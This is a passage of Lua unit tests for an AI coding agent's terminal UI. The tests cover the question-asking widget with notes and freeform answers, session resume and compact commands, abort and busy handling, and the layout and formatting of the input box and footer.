-- T126: the freeform answer and option notes (add-ask-tool 3.3).
do
  local rec = { continued = 0 }
  local agent_stub = {
    turn = function() return true end,
    get_history = function() return {} end,
    answer_ask = function(id, answer) rec.answer = answer; return false end,
    continue = function() rec.continued = rec.continued + 1; return true end,
  }
  local function boot(questions)
    local uimod, S = run_ui_with({ 17 }, { agent = agent_stub })
    -- the harness restores globals after run(); resolving an answer calls into
    -- the agent again, so the stub has to be reachable for the post-run keys
    _G.agent = agent_stub
    uimod._handle_agent_event({ type = "ask", id = "a1", questions = questions })
    return uimod, S
  end
  local function type_text(uimod, str)
    for i = 1, #str do uimod._handle_key({ kind = "text", char = str:sub(i, i) }) end
  end
  local down, enter, esc, tab = { kind = "special", name = "down" }, { kind = "enter" },
      { kind = "esc" }, { kind = "tab" }
  local up = { kind = "special", name = "up" }
  local qs = { { id = "scope", question = "Scope?",
                 options = { { label = "src" }, { label = "all" } } } }

  -- Tab writes a note on the highlighted option
  local m, S = boot(qs)
  m._handle_key(tab)
  assert_eq(S.ask.mode, "note", "T126 Tab opens the note editor")
  type_text(m, "too big")
  assert_eq(S.ask.editor, "too big", "T126 the editor buffer holds the note")
  m._handle_key(enter)
  assert_eq(S.ask.mode, "list", "T126 Enter commits and returns to the list")
  assert_eq(S.ask.answers[1].notes.src, "too big", "T126 the note is saved on its option")
  assert_true(table.concat(m._render_all(80), "\n"):find("too big", 1, true) ~= nil,
    "T126 the note renders under its option")

  -- the note editor's Esc discards its edits and does not cancel the set
  m._handle_key(tab)
  type_text(m, "XX")
  m._handle_key(esc)
  assert_eq(S.ask.mode, "list", "T126 Esc returns to the option list")
  assert_eq(S.ask.answers[1].notes.src, "too big", "T126 Esc discarded the edits")
  assert_notnil(S.ask, "T126 Esc did not cancel the question set")
  assert_eq(S.ask.editor, "", "T126 the editor buffer is dropped")

  -- ↑ inside an editor does not move the highlight
  local sel_before = S.ask.sel
  m._handle_key(tab)
  m._handle_key(up)
  assert_eq(S.ask.mode, "note", "T126 ↑ does not leave the editor")
  assert_eq(S.ask.sel, sel_before, "T126 editing keys do not move the highlight")
  m._handle_key(esc)

  -- an empty commit clears a note again
  m._handle_key(tab)
  m._handle_key({ kind = "backspace" })
  assert_eq(S.ask.editor, "too bi", "T126 backspace edits the buffer")
  m._handle_key(enter)
  assert_eq(S.ask.answers[1].notes.src, "too bi", "T126 the edited note is saved")

  -- the note travels with the answer
  m._handle_key(enter)
  assert_eq(rec.answer[1].selected[1], "src", "T126 the highlighted option is the answer")
  assert_eq(rec.answer[1].notes.src, "too bi", "T126 the note travels with the answer")

  -- freeform: Enter opens, text commits, Enter submits
  rec.answer = nil
  local m2, S2 = boot(qs)
  m2._handle_key(down)
  m2._handle_key(down)
  assert_eq(S2.ask.sel, 3, "T126 ↓ reaches the freeform row")
  m2._handle_key(enter)
  assert_eq(S2.ask.mode, "other", "T126 Enter opens the editor while no text is committed")
  type_text(m2, "Nuxt")
  m2._handle_key(enter)
  assert_eq(S2.ask.mode, "list", "T126 Enter commits the freeform text")
  assert_eq(S2.ask.answers[1].other, "Nuxt", "T126 the text is kept on the question")
  assert_eq(rec.answer, nil, "T126 committing alone does not submit")
  m2._handle_key(enter)
  assert_notnil(rec.answer, "T126 Enter submits once the freeform text is committed")
  assert_eq(rec.answer[1].other, "Nuxt", "T126 the freeform text is the answer")
  assert_eq(#rec.answer[1].selected, 0, "T126 a freeform-only answer has no selection")

  -- Esc in the freeform editor discards and keeps the set open
  rec.answer = nil
  local m3, S3 = boot(qs)
  m3._handle_key(down)
  m3._handle_key(down)
  m3._handle_key(enter)
  type_text(m3, "Nuxt")
  m3._handle_key(esc)
  assert_eq(S3.ask.mode, "list", "T126 Esc leaves the freeform editor")
  assert_eq(S3.ask.answers[1].other, "", "T126 the freeform edit was discarded")
  assert_eq(rec.answer, nil, "T126 the set is still open")

  -- Tab re-opens the freeform editor, prefilled with the committed text
  m3._handle_key(enter)
  type_text(m3, "Nuxt")
  m3._handle_key(enter)
  m3._handle_key(tab)
  assert_eq(S3.ask.mode, "other", "T126 Tab on the freeform row re-opens the editor")
  assert_eq(S3.ask.editor, "Nuxt", "T126 the editor is prefilled with the committed text")
  m3._handle_key(esc)

  -- a question with no options is answerable through the freeform row
  rec.answer = nil
  local m4, S4 = boot({ { id = "free", question = "Anything?", options = {} } })
  m4._handle_key(enter)
  assert_eq(S4.ask.mode, "other", "T126 an optionless question opens the freeform editor")
  type_text(m4, "all of it")
  m4._handle_key(enter)
  m4._handle_key(enter)
  assert_notnil(rec.answer, "T126 an optionless question is answerable")
  assert_eq(rec.answer[1].other, "all of it", "T126 the typed text is the answer")

  -- an empty commit clears a committed freeform answer
  rec.answer = nil
  local m5, S5 = boot(qs)
  m5._handle_key(down)
  m5._handle_key(down)
  m5._handle_key(enter)
  type_text(m5, "Nuxt")
  m5._handle_key(enter)
  m5._handle_key(tab)
  m5._handle_key({ kind = "backspace" })
  m5._handle_key({ kind = "backspace" })
  m5._handle_key({ kind = "backspace" })
  m5._handle_key({ kind = "backspace" })
  m5._handle_key(enter)
  assert_eq(S5.ask.answers[1].other, "", "T126 an empty commit clears the freeform answer")
  print("T126 freeform and notes: OK")
end

-- T127: the block's keys are documented and its glyphs degrade (3.4/3.5).
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end,
                       answer_ask = function() return false end, continue = function() return true end }
  local uimod, S = run_ui_with({ 17 }, { agent = agent_stub })
  _G.agent = agent_stub

  assert_notnil(uimod.ASK_KEYS, "T127 the block's bindings are exported")
  for _, key in ipairs({ "up", "down", "enter", "1", "space", "tab", "left", "esc", "backspace" }) do
    assert_notnil(uimod.ASK_KEYS[key], "T127 the block documents " .. key)
  end

  uimod._handle_agent_event({ type = "ask", id = "a1", questions = {
    { id = "scope", question = "Scope?", multi = true,
      options = { { label = "src" } } } } })
  S.ask.answers[1].selected = { "src" }
  S.ask.answers[1].notes = { src = "careful" }
  S.ask.answers[1].other = "Nuxt"
  uimod._sync_tail()

  -- ASCII mode: no glyph the block introduces survives untranslated
  uimod._ascii_mode = true
  local rows = uimod._render_all(80)
  local joined = table.concat(rows, "\n")
  assert_true(joined:find("[x]", 1, true) ~= nil, "T127 the toggle marker is ASCII")
  assert_true(joined:find("->", 1, true) ~= nil, "T127 the note marker degrades")
  for _, glyph in ipairs({ "↳", "▌", "«", "»" }) do
    assert_true(joined:find(glyph, 1, true) == nil,
      "T127 no " .. glyph .. " glyph is left in ASCII mode")
  end
  -- and the ASCII freeform hint quotes with plain quotes instead
  assert_true(joined:find('"Nuxt"', 1, true) ~= nil,
    "T127 the freeform hint quotes in ASCII: " .. joined:gsub("\n", " | "):sub(1, 120))
  uimod._ascii_mode = nil
  print("T127 block keys and ASCII: OK")
end

-- T128 (4.1/4.5): commands module owns resume/new/compact/list helpers.
do
  local names = {"session", "agent", "api"}
  local orig = {}
  for _, n in ipairs(names) do orig[n] = _G[n] end

  local history
  local clears = 0
  local journal = {
    sess1 = {
      { role = "user", content = "q1" },
      { role = "assistant", content = "a1" },
      { role = "assistant", tool_calls = { { id = "c1", name = "read" } } },
      { role = "tool", tool_call_id = "c1", content = "file body" },
      { role = "user", content = "q2" },
      { role = "assistant", content = "a2" },
    },
  }
  _G.session = {
    latest = function() return "sess1" end,
    resume = function(id) return journal[id] end,
    new_session = function(ws, model) return "new-" .. tostring(model) end,
    session_files = function()
      return { { id = "sess1", ts = "2026-01-01", first_line = "q1" } }
    end,
  }
  _G.agent = {
    clear = function() clears = clears + 1; history = {} end,
    get_history = function() return history end,
    add_user = function(c) history[#history + 1] = { role = "user", content = c } end,
    add_assistant = function(m)
      if type(m) == "table" then history[#history + 1] = { role = "assistant", tool_calls = m.tool_calls }
      else history[#history + 1] = { role = "assistant", content = m } end
    end,
    add_tool_result = function(id, content)
      history[#history + 1] = { role = "tool", tool_call_id = id, content = content }
    end,
    compress_history = function(h)
      return { { role = "system", content = "summary: short" }, { role = "user", content = "q2" } }
    end,
    estimate_tokens = function() return 10 end,
  }
  _G.api = {
    list_models = function() return { "static-a", "static-b" } end,
    list_models_live = function() return nil, "offline" end,
  }

  local commands = assert(loadfile("src/tether/commands.lua"))()

  -- resume with explicit id rebuilds history including tool results
  history = { { role = "system", content = "stale" } }
  local sid, messages = commands.resume("sess1")
  assert_eq(sid, "sess1", "T128 resume returns explicit id")
  assert_eq(#messages, 6, "T128 resume returns journal messages")
  assert_eq(clears, 1, "T128 resume clears agent first")
  assert_eq(#history, 6, "T128 history rebuilt in order")
  assert_eq(history[1].role, "user", "T128 first rebuilt is user")
  assert_notnil(history[3].tool_calls, "T128 tool_calls preserved for API")
  assert_eq(history[4].role, "tool", "T128 tool result restored")
  assert_eq(history[6].content, "a2", "T128 full journal restored")

  -- resume with no id falls back to latest(workspace)
  local sid2 = commands.resume(nil, "/ws")
  assert_eq(sid2, "sess1", "T128 resume(nil, ws) resolves latest")

  -- unknown journal id still returns the id (caller owns cfg) but no messages
  clears = 0
  history = { { role = "user", content = "keep" } }
  local sid3, msgs3 = commands.resume("missing")
  assert_eq(sid3, "missing", "T128 explicit id is returned as-is")
  assert_eq(msgs3, nil, "T128 missing journal yields nil messages")
  assert_eq(clears, 1, "T128 resume always clears the agent")

  -- new creates a session and clears the agent
  clears = 0
  history = { { role = "user", content = "keep" } }
  local nid = commands.new("/ws", "test")
  assert_eq(nid, "new-test", "T128 new returns session id")
  assert_eq(clears, 1, "T128 new clears agent")
  assert_eq(#history, 0, "T128 new leaves empty history")

  -- compact compresses in place and returns the summary
  history = {
    { role = "user", content = "q1" },
    { role = "assistant", content = "a1" },
    { role = "user", content = "q2" },
  }
  local summary = commands.compact()
  assert_eq(summary, "summary: short", "T128 compact returns summary text")
  assert_eq(#history, 2, "T128 compact mutates history in place")
  assert_eq(history[1].role, "system", "T128 compact result is system summary")

  -- list_sessions + list_models fallback
  local files = commands.list_sessions("/ws")
  assert_eq(#files, 1, "T128 list_sessions returns journal rows")
  assert_eq(files[1].id, "sess1", "T128 list_sessions keeps ids")
  local models = commands.list_models({}, "key")
  assert_eq(#models, 2, "T128 list_models falls back to static list")
  assert_eq(models[1].id, "static-a", "T128 static model shape has id")
  assert_eq(models[1].name, "static-a", "T128 static model shape has name")

  for _, n in ipairs(names) do _G[n] = orig[n] end
  print("T128 commands module: OK")
end

-- T129 (5.1/5.3): turn facade — abort seam, busy begin/finish, agent wrappers.
do
  local names = {"agent", "tether"}
  local orig = {}
  for _, n in ipairs(names) do orig[n] = _G[n] end

  local clears = 0
  local host_interrupt = false
  local host_cleared = 0
  local turn_calls = {}
  _G.tether = {
    abort_requested = function() return host_interrupt end,
    clear_abort = function() host_cleared = host_cleared + 1; host_interrupt = false end,
  }
  _G.agent = {
    abort_requested = false,
    turn = function() turn_calls[#turn_calls + 1] = "turn"; return true end,
    confirm = function() turn_calls[#turn_calls + 1] = "confirm"; return true end,
    answer_ask = function() turn_calls[#turn_calls + 1] = "answer"; return true end,
    continue = function() turn_calls[#turn_calls + 1] = "continue"; return true end,
  }
  local turn = assert(loadfile("src/tether/turn.lua"))()

  -- abort seam: UI flag, host flag, ack clears both
  _G.agent.abort_requested = true
  assert_true(turn.take_abort(_G.agent), "T129 take_abort sees the UI flag")
  turn.ack_abort(_G.agent)
  assert_false(_G.agent.abort_requested, "T129 ack clears the UI flag")
  host_interrupt = true
  assert_true(turn.take_abort(_G.agent), "T129 take_abort sees the host flag")
  turn.ack_abort(_G.agent)
  assert_false(host_interrupt, "T129 ack clears the host flag")
  assert_eq(host_cleared, 2, "T129 ack calls tether.clear_abort")

  -- turn.abort sets the flag without ui touching agent.abort_requested directly
  turn.abort()
  assert_true(_G.agent.abort_requested, "T129 turn.abort raises the UI flag")
  turn.ack_abort(_G.agent)

  -- busy begin/finish is the single reset place
  local S = { busy_started_at = 1, retry_wait = { attempt = 1 } }
  turn.begin(S)
  assert_true(S.busy, "T129 begin sets busy")
  assert_true(S.waiting, "T129 begin sets waiting")
  assert_false(S.streaming, "T129 begin clears streaming")
  assert_notnil(S.busy_started_at, "T129 begin stamps busy_started_at")
  turn.finish(S)
  assert_false(S.busy, "T129 finish clears busy")
  assert_false(S.waiting, "T129 finish clears waiting")
  assert_eq(S.busy_started_at, nil, "T129 finish clears busy_started_at")
  assert_eq(S.retry_wait, nil, "T129 finish clears retry_wait")

  -- wrappers reach the agent entry points; start paints via before_call
  local painted_before_turn = false
  local S2 = {}
  turn.start(S2, {}, "k", "hi", function() end, function()
    painted_before_turn = S2.busy == true
  end)
  assert_eq(turn_calls[1], "turn", "T129 start calls agent.turn")
  assert_true(painted_before_turn, "T129 before_call runs while busy (T54 placeholder)")
  assert_false(S2.busy, "T129 start finishes busy")

  turn.confirm("c1", "allow", {}, function() end)
  turn.answer("a1", {}, {}, function() end)
  turn.continue(S2, {}, "k", function() end)
  assert_eq(turn_calls[2], "confirm", "T129 confirm calls agent.confirm")
  assert_eq(turn_calls[3], "answer", "T129 answer calls agent.answer_ask")
  assert_eq(turn_calls[4], "continue", "T129 continue calls agent.continue")

  for _, n in ipairs(names) do _G[n] = orig[n] end
  print("T129 turn facade: OK")
end

-- ============================================================
-- pi-style-input-and-footer: dock layout, box, caret, footer
-- ============================================================
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end }
  local function strip(s) return (s or ""):gsub("\27%[[%d;]*m", "") end
  local function type_text(uimod, text)
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
  end
  local function boot(stub, size, extra)
    local uimod = run_ui_with({ 17 }, (function()
      local s = { agent = stub or agent_stub, size = size }
      if extra then for k, v in pairs(extra) do s[k] = v end end
      return s
    end)())
    if extra and extra.skills then uimod._skills_stub = extra.skills end
    return uimod
  end

  -- 2.1: the dock budget addresses the new rows for empty input, multi-line
  -- input, an open palette and a visible error banner.
  do
    local uimod = boot()
    uimod._paint(true)
    local L = uimod._layout()
    assert_notnil(L.rule_top_row, "pi 2.1 empty input has a top rule row")
    assert_notnil(L.input_row, "pi 2.1 empty input has an input row")
    assert_notnil(L.rule_bottom_row, "pi 2.1 empty input has a bottom rule row")
    assert_notnil(L.footer_row, "pi 2.1 empty input has a footer row")
    assert_eq(L.stats_row, L.footer_row, "pi 2.1 stats share the single footer row")
    assert_eq(L.rule_bottom_row + 1, L.footer_row, "pi 2.1 footer follows the bottom rule when palette is closed")
    assert_true(L.transcript_h >= 1, "pi 2.1 transcript keeps at least one row")
    assert_true(L.rule_top_row > L.error_row + L.error_h - 1, "pi 2.1 box sits below the error row")

    -- multi-line input grows the box between the two rules
    type_text(uimod, "line1")
    uimod._handle_key({ kind = "newline" })
    type_text(uimod, "line2")
    uimod._paint(true)
    local L2 = uimod._layout()
    assert_true(L2.input_h >= 2, "pi 2.1 multi-line input reserves two rows")
    assert_eq(L2.rule_bottom_row, L2.rule_top_row + 1 + L2.input_h, "pi 2.1 rules bracket exactly the input rows")
    local rtop = strip(uimod._row(L2.rule_top_row))
    local rbot = strip(uimod._row(L2.rule_bottom_row))
    assert_true(rtop:find("─", 1, true) ~= nil or rtop:find("%-", 1, true) ~= nil, "pi 2.1 top rule painted")
    assert_true(rbot:find("─", 1, true) ~= nil or rbot:find("%-", 1, true) ~= nil, "pi 2.1 bottom rule painted")

    -- open palette inserts rows between the bottom rule and the footer
    local uimod_p = boot()
    uimod_p._skills_stub = function()
      local out = {}
      for i = 1, 12 do
        out[i] = { name = "s" .. i, description = "d", path = "/tmp/s" .. i .. "/SKILL.md" }
      end
      return out
    end
    type_text(uimod_p, "/")
    uimod_p._paint(true)
    local Lp = uimod_p._layout()
    assert_true(Lp.palette_h >= 1, "pi 2.1 open palette reserves rows")
    assert_eq(Lp.footer_row, Lp.rule_bottom_row + Lp.palette_h + 1, "pi 2.1 footer follows the palette region")

    -- error banner sits above the box and is included in the layout
    uimod._set_error_banner("boom")
    uimod._paint(true)
    local Le = uimod._layout()
    assert_eq(Le.error_h, 1, "pi 2.1 error banner reserves one row")
    assert_eq(Le.error_row, 1 + Le.transcript_h, "pi 2.1 error row is directly below the transcript")
    assert_eq(Le.rule_top_row, Le.error_row + 1, "pi 2.1 box starts below the error banner")
    local erow = strip(uimod._row(Le.error_row))
    assert_true(erow:find("boom", 1, true) ~= nil, "pi 2.1 error banner paints its message")
    uimod._set_error_banner(nil)
  end

  -- 2.2: the single footer row — always present, no separate flag row, and
  -- the transcript height does not change with transient flags.
  do
    local uimod = boot()
    uimod._paint(true)
    local S = uimod._get_state()
    S._mouse_flag_until = os.time() - 1
    S.kb_protocol = 0
    S.toast = nil
    uimod._paint(true)
    local L0 = uimod._layout()
    assert_eq(L0.flags_row, nil, "pi 2.2 no separate flag row")
    assert_eq(L0.stats_row, L0.footer_row, "pi 2.2 stats share the footer row")
    local th0 = L0.transcript_h

    -- active toast / kb protocol / mouse flag must not add a row
    S.kb_protocol = 1
    S.toast = "✓ test"
    S._mouse_flag_until = os.time() + 3
    uimod._paint(true)
    local L1 = uimod._layout()
    assert_eq(L1.flags_row, nil, "pi 2.2 no flag row even with toast")
    assert_eq(L1.transcript_h, th0, "pi 2.2 transcript height unchanged by flags")
    assert_eq(L1.footer_row, L0.footer_row, "pi 2.2 footer row does not move")

    -- every dock row is strictly ordered down to the single footer
    assert_true(L1.rule_top_row < L1.input_row, "pi 2.2 top rule above input")
    assert_true(L1.input_row + L1.input_h - 1 < L1.rule_bottom_row, "pi 2.2 input above bottom rule")
    assert_true(L1.rule_bottom_row < L1.footer_row, "pi 2.2 bottom rule above footer")
    assert_true(L1.footer_row <= S.h, "pi 2.2 footer is on screen")
  end

  -- 3.1: the box renders without a prompt marker; padding 0 and 2; every row
  -- shares one display width; ASCII mode swaps the rule glyph.
  do
    local uimod = boot(nil, nil, { config = { load = function()
      return { model = "test", workspace = "/tmp",
               ui = { input_max_lines = 8, editor_padding_x = 0 } } end,
      api_key = function() return "" end } })
    type_text(uimod, "hi")
    uimod._paint(true)
    local L = uimod._layout()
    local input = uimod._row(L.input_row) or ""
    assert_eq(strip(input):find("›", 1, true), nil, "pi 3.1 no prompt marker inside the box")
    assert_true(strip(input):find("hi", 1, true) ~= nil, "pi 3.1 typed text is in the input row")
    local rtop, rbot, body = uimod._row(L.rule_top_row), uimod._row(L.rule_bottom_row), input
    local function width_of(s)
      -- display width ignoring SGR
      local plain = strip(s)
      return uimod.vlen(plain)
    end
    assert_eq(width_of(rtop), L.w, "pi 3.1 top rule spans the full width")
    assert_eq(width_of(rbot), L.w, "pi 3.1 bottom rule spans the full width")
    assert_eq(width_of(body), L.w, "pi 3.1 input row is padded to the same width")

    -- padding 2: text is inset by two columns on both sides
    local uimod2 = boot(nil, nil, { config = { load = function()
      return { model = "test", workspace = "/tmp",
               ui = { input_max_lines = 8, editor_padding_x = 2 } } end,
      api_key = function() return "" end } })
    type_text(uimod2, "ab")
    uimod2._paint(true)
    local L2 = uimod2._layout()
    local body2 = strip(uimod2._row(L2.input_row) or "")
    assert_eq(body2:sub(1, 2), "  ", "pi 3.1 padding 2 leads with two spaces")
    assert_eq(body2:sub(-2), "  ", "pi 3.1 padding 2 ends with two spaces")
    assert_eq(body2:find("ab", 1, true), 3, "pi 3.1 text starts after the left padding")

    -- ASCII mode: the rules use '-'
    local uimod3 = boot()
    uimod3._ascii_mode = true
    type_text(uimod3, "x")
    uimod3._paint(true)
    local L3 = uimod3._layout()
    local art = strip(uimod3._row(L3.rule_top_row) or "")
    assert_true(art:find("─", 1, true) == nil, "pi 3.1 ASCII top rule has no box-drawing glyph")
    assert_true(art:find("-", 1, true) ~= nil, "pi 3.1 ASCII top rule uses '-'")
    uimod3._ascii_mode = nil
  end

  -- 3.2: centered scroll labels in the rules, omitted when the rule is too
  -- narrow; hidden-above-only and hidden-below-only windows.
  do
    local uimod = boot(nil, nil, { config = { load = function()
      return { model = "test", workspace = "/tmp",
               ui = { input_max_lines = 3 } } end,
      api_key = function() return "" end } })
    -- five lines with cursor on the last → hidden above
    type_text(uimod, "a")
    for _ = 1, 4 do uimod._handle_key({ kind = "newline" }); type_text(uimod, "x") end
    uimod._paint(true)
    local L = uimod._layout()
    local top = strip(uimod._row(L.rule_top_row) or "")
    local bot = strip(uimod._row(L.rule_bottom_row) or "")
    assert_true(top:find("more", 1, true) ~= nil, "pi 3.2 top rule names hidden-above rows: " .. top:sub(1, 60))
    assert_true(top:find("↑", 1, true) ~= nil or top:find("%^", 1, true) ~= nil,
      "pi 3.2 hidden-above label uses the up glyph")
    assert_eq(bot:find("more", 1, true), nil, "pi 3.2 bottom rule has no label when nothing is hidden below")

    -- narrow terminal: label does not fit, rule stays an unbroken run
    local uimod_n = boot(nil, { width = 6, height = 20 }, { config = { load = function()
      return { model = "t", workspace = "/tmp",
               ui = { input_max_lines = 3 } } end,
      api_key = function() return "" end } })
    type_text(uimod_n, "a")
    for _ = 1, 4 do uimod_n._handle_key({ kind = "newline" }); type_text(uimod_n, "x") end
    uimod_n._paint(true)
    local Ln = uimod_n._layout()
    local topn = strip(uimod_n._row(Ln.rule_top_row) or "")
    assert_eq(topn:find("more", 1, true), nil, "pi 3.2 narrow rule drops the label")
    assert_true(#topn > 0, "pi 3.2 narrow rule still paints glyphs")
  end

  -- 3.3: block caret — mid-row, end-of-row, Cyrillic; no cursor-show escape.
  do
    local sink = {}
    local uimod = run_ui_with({ 104, 105, 105, 17 }, { agent = agent_stub }, sink) -- "hii"
    -- actually type three chars via keys after boot for cursor control
    uimod = run_ui_with({ 17 }, { agent = agent_stub }, sink)
    type_text(uimod, "abc")
    -- move cursor left once → sits on 'c'
    uimod._handle_key({ kind = "special", name = "left" })
    uimod._paint(true)
    local L = uimod._layout()
    local body = uimod._row(L.input_row) or ""
    local plain = strip(body)
    -- the character under the cursor is painted in reverse video
    assert_true(body:find("\27[7m", 1, true) ~= nil, "pi 3.3 mid-row caret uses reverse video")
    assert_true(plain:find("c", 1, true) ~= nil, "pi 3.3 caret sits on a real character")

    -- end-of-row caret: move to end
    uimod._handle_key({ kind = "special", name = "end" })
    uimod._paint(true)
    body = uimod._row(L.input_row) or ""
    assert_true(body:find("\27[7m", 1, true) ~= nil, "pi 3.3 end-of-row caret uses reverse video")

    -- Cyrillic cursor offset: byte offset vs display column
    local uimod_c = run_ui_with({ 17 }, { agent = agent_stub })
    type_text(uimod_c, "привет")
    uimod_c._handle_key({ kind = "special", name = "left" })
    uimod_c._paint(true)
    local Lc = uimod_c._layout()
    local bodyc = uimod_c._row(Lc.input_row) or ""
    assert_true(bodyc:find("\27[7m", 1, true) ~= nil, "pi 3.3 Cyrillic caret is reverse video")
    local plainc = strip(bodyc)
    assert_true(plainc:find("т", 1, true) ~= nil or plainc:find("е", 1, true) ~= nil,
      "pi 3.3 Cyrillic caret covers a whole character")

    -- no painted frame emits a cursor-show escape; ?25h is only the exit
    -- teardown (co-issued with ?2004l), never a render frame
    for _, s in ipairs(sink) do
      if s:find("\27[?25h", 1, true) then
        assert_true(s:find("\27[?2004l", 1, true) ~= nil,
          "pi 3.3 no frame emits ESC[?25h")
      end
    end
  end

  -- 4.1: the busy spinner with elapsed seconds in the top rule, cleared when
  -- the turn ends (reply).
  do
    local uimod = run_ui_with({ 104, 105, 13, 17 }, { agent = {
      turn = function(_, _, _, on_ev)
        -- mid-turn: the top rule must carry the spinner + elapsed
        uimod.busy_probe = true
        return true
      end,
      get_history = function() return {} end } })
    local S = uimod._get_state()
    -- drive a submit so busy is set, then inspect mid-flight via paint after
    -- the turn returned (busy cleared) vs a forced busy state
    S.busy = true
    S.busy_started_at = os.time()
    uimod._paint(true)
    local L = uimod._layout()
    local top = uimod._row(L.rule_top_row) or ""
    assert_true(strip(top):find("думает", 1, true) ~= nil, "pi 4.1 busy top rule names the turn")
    assert_true(strip(top):find("s", 1, true) ~= nil, "pi 4.1 busy top rule carries elapsed seconds")
    -- end path: reply clears it
    S.busy = false
    S.busy_started_at = nil
    uimod._paint(true)
    top = strip(uimod._row(L.rule_top_row) or "")
    assert_eq(top:find("думает", 1, true), nil, "pi 4.1 reply clears the busy indicator")
    assert_true(top:find("─", 1, true) ~= nil or top:find("%-", 1, true) ~= nil,
      "pi 4.1 top rule is a plain rule again")
  end

  -- 4.2 is covered by T119 (pending retry in the top rule).

  -- 4.3: a long status on a narrow terminal stays one truncated row; a label
  -- that does not fit is dropped while the status stays.
  do
    local uimod = boot(nil, { width = 12, height = 20 })
    local S = uimod._get_state()
    S.busy = true
    S.busy_started_at = os.time()
    -- force a hidden-above label that cannot coexist with the status
    uimod._paint(true)
    local L = uimod._layout()
    local top = uimod._row(L.rule_top_row) or ""
    local plain = strip(top)
    assert_true(#plain > 0, "pi 4.3 narrow top rule still paints")
    assert_true(uimod.vlen(plain) <= L.w, "pi 4.3 narrow top rule never exceeds the width")
    -- status survives as a truncated single row (full word may not fit at w=12)
    assert_true(plain:find("─", 1, true) ~= nil or plain:find("%-", 1, true) ~= nil
      or plain:find("дум", 1, true) ~= nil or plain:find("tether", 1, true) ~= nil
      or plain:find("…", 1, true) ~= nil, "pi 4.3 narrow rule keeps status or glyphs: " .. plain)
    S.busy = false
  end

  -- 5.1: two usage events accumulate into tokens_in / tokens_out; the context
  -- estimate keeps using tokens_used.
  do
    local uimod = run_ui_with({ 17 }, { agent = agent_stub })
    local S = uimod._get_state()
    assert_eq(S.tokens_in, 0, "pi 5.1 starts at zero in")
    assert_eq(S.tokens_out, 0, "pi 5.1 starts at zero out")
    uimod._handle_agent_event({ type = "usage", usage = { used = 100, prompt_tokens = 1200, completion_tokens = 300 } })
    uimod._handle_agent_event({ type = "usage", usage = { used = 150, prompt_tokens = 800, completion_tokens = 200 } })
    assert_eq(S.tokens_in, 2000, "pi 5.1 input tokens accumulate across turns")
    assert_eq(S.tokens_out, 500, "pi 5.1 output tokens accumulate across turns")
    assert_eq(S.tokens_used, 150, "pi 5.1 tokens_used stays the context estimate (last used)")
  end

  -- 5.2: compact counter formatter and stats-row composition.
  do
    local ui = dofile("src/tether/ui.lua")
    assert_eq(ui.format_count(0), "0", "pi 5.2 zero")
    assert_eq(ui.format_count(999), "999", "pi 5.2 plain below 1000")
    assert_eq(ui.format_count(1000), "1.0k", "pi 5.2 one decimal k below 10k")
    assert_eq(ui.format_count(9999), "10.0k", "pi 5.2 9999 rounds up to 10.0k")
    assert_eq(ui.format_count(10000), "10k", "pi 5.2 rounded k below 1M")
    assert_eq(ui.format_count(999999), "1000k", "pi 5.2 just under 1M stays k")
    assert_eq(ui.format_count(1000000), "1.0M", "pi 5.2 one decimal M below 10M")
    assert_eq(ui.format_count(10000000), "10M", "pi 5.2 rounded M above")
    assert_eq(ui.format_count(-5), "0", "pi 5.2 negative clamps to zero")

    -- stats row: model right-aligned with a two-column gap
    local left = "↑3.0k ↓1.0k 4.1k/32k (13%)"
    local right = "gpt-4o-mini"
    local row = ui.footer_stats(left, right, 60)
    local plain = (row or ""):gsub("\27%[[%d;]*m", "")
    assert_true(plain:find("gpt-4o-mini", 1, true) ~= nil, "pi 5.2 model fits when there is room")
    assert_eq(plain:sub(-#right), right, "pi 5.2 model ends in the last column")
    local gap = #plain - #right - #left
    assert_true(gap >= 2, "pi 5.2 at least two columns separate left from model (gap=" .. gap .. ")")

    -- both cannot fit: model truncated from its left, tail survives
    local narrow = ui.footer_stats(left, right, #left + 4)
    local nplain = (narrow or ""):gsub("\27%[[%d;]*m", "")
    assert_true(nplain:find("mini", 1, true) ~= nil, "pi 5.2 model keeps its tail when truncated")
    assert_eq(nplain:find("gpt-", 1, true), nil, "pi 5.2 model loses its head first")

    -- left alone exceeds the width: left truncated from the right with ...
    local only = ui.footer_stats(string.rep("x", 100), "", 10)
    assert_true(ui.vlen(only) <= 10, "pi 5.2 left side truncated to the width")
  end

  -- 5.3: single footer row (path + stats + model), no mode icons;
  -- 5.4: no reverse video.
  do
    local uimod = boot()
    local S = uimod._get_state()
    S._mouse_flag_until = os.time() + 3  -- fresh mouse flag must not paint
    S.kb_protocol = 1
    S.toast = nil
    uimod._paint(true)
    local L = uimod._layout()
    local footer = strip(uimod._row(L.footer_row) or "")
    assert_true(footer:find("/tmp", 1, true) ~= nil or footer:find("~", 1, true) ~= nil,
      "pi 5.3 footer carries the workspace: " .. footer)
    assert_eq(footer:find("🖱", 1, true), nil, "pi 5.3 no mouse icon")
    assert_eq(footer:find("⌨", 1, true), nil, "pi 5.3 no kb icon")
    assert_eq(L.flags_row, nil, "pi 5.3 no separate flag row")
    -- 5.4: footer row uses no reverse video
    local raw = uimod._row(L.footer_row) or ""
    assert_eq(raw:find("\27[7m", 1, true), nil, "pi 5.4 footer row is not reverse video")

    -- ASCII arrows in the counters on the single footer row
    local uimod_a = boot()
    uimod_a._ascii_mode = true
    local Sa = uimod_a._get_state()
    Sa.tokens_in, Sa.tokens_out = 3000, 1000
    Sa._mouse_flag_until = os.time() - 1
    Sa.kb_protocol = 0
    Sa.toast = nil
    uimod_a._paint(true)
    local La = uimod_a._layout()
    local stats_a = strip(uimod_a._row(La.footer_row) or "")
    assert_true(stats_a:find("^", 1, true) ~= nil, "pi 5.3 ASCII input arrow is '^': " .. stats_a)
    assert_true(stats_a:find("v", 1, true) ~= nil, "pi 5.3 ASCII output arrow is 'v': " .. stats_a)
    assert_eq(stats_a:find("↑", 1, true), nil, "pi 5.3 no Unicode up-arrow in ASCII stats")
    assert_eq(stats_a:find("↓", 1, true), nil, "pi 5.3 no Unicode down-arrow in ASCII stats")
    uimod_a._ascii_mode = nil
  end

  -- 5.5: truncation order when the left side exceeds the width —
  -- path right-truncates first (toast and scroll stay), then toast is
  -- dropped before the scroll flag, and stats truncate last while the
  -- path stays on the row. ASCII mode must not inject a Unicode ellipsis.
  do
